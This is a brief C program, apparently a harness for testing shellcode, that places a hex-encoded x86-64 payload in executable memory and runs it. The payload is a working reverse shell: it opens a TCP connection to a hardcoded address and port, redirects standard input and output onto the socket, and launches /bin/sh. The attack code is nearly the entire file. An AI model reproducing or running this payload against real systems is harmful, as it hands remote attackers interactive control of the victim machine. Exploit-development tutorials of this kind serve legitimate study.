/*
 *
 * http://www.thexploit.com/sploitdev/testing-your-shellcode-on-a-non-executable-stack-or-heap/
 *
 */
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char code[] = \
"\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99"
"\x0f\x05\x48\x97\x48\xb8\x02\xff\xaa\xaa"
"\xac\x11\x0b\x95\x80\xf4\xff\x50\x48\x89"
"\xe6\x48\x31\xc0\x04\x2a\x80\xc2\x10\x0f"
"\x05\x48\x89\xfe\x48\xff\xce\xb0\x21\x0f"
"\x05\x75\xf7\x99\x04\x3b\x48\xbb\x2f\x62"
"\x69\x6e\x2f\x2f\x73\x68\x52\x53\x54\x5f"
"\x52\x57\x54\x5e\x0f\x05";

int main(int argc, char **argv) {
 
	void *ptr = mmap(0, sizeof(code),
		PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON
		| MAP_PRIVATE, -1, 0);
 
	if (ptr == MAP_FAILED) {
		 perror("mmap");
		 exit(-1);
	}

	printf("Shellcode: [%d]\n", sizeof(code));
 
	memcpy(ptr, code, sizeof(code));
	sc = ptr;
 
	sc();
 
	return 0;
}
